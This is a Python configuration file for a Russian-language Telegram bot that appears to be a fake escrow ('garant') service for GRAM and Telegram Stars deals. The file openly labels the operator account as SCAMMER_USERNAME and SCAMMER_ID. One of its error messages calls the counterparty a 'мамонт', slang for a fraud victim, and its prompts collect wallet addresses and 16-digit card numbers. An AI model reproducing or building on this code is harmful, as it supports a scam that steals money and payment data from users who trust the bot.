# config.py
import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

# ID админов
ADMIN_IDS = [
    8187269902,  # твой ID
]

# Твой аккаунт для уведомлений
SCAMMER_USERNAME = "@MalonGarant"
SCAMMER_ID = 8187269902

# Поддержка
SUPPORT_USERNAME = "@MalonGarant"

# Комиссия
COMMISSION = 3.0

# Путь к GIF
WELCOME_GIF_PATH = "gifs/welcome.gif.mp4"

# Премиум эмодзи (потом подставишь)
EMOJI_DEAL = "🔨"
EMOJI_PAID = "💜"
EMOJI_GRAM = "🪙"
EMOJI_CARD = "💳"
EMOJI_STARS = "⭐"
EMOJI_SUCCESS = "✅"
EMOJI_WARNING = "⚠️"
EMOJI_INFO = "ℹ️"

# Валюты
CURRENCIES = {
    "gram": "GRAM",
    "stars": "Звёзды"
}

# Ошибки
ERROR_MESSAGES = {
    "no_requisites": "❗ У вас ещё не добавлен реквизит GRAM!\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить GRAM",
    "invalid_gram": "⚠️ Вы указали неверный адрес кошелька GRAM!\n\n❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст",
    "invalid_card": "⚠️ Неверный формат карты!\n\nВведите 16 цифр",
    "deal_not_found": "❌ Сделка не найдена.",
    "deal_already_paid": "❌ Эта сделка уже оплачена или завершена.",
    "deal_not_joined": "❌ Мамонт ещё не присоединился к сделке.",
    "access_denied": "❌ Доступ запрещён.",
    "invalid_amount": "❌ Введите корректное число",
    "description_too_long": "❌ Описание слишком длинное (макс 200 символов)"
}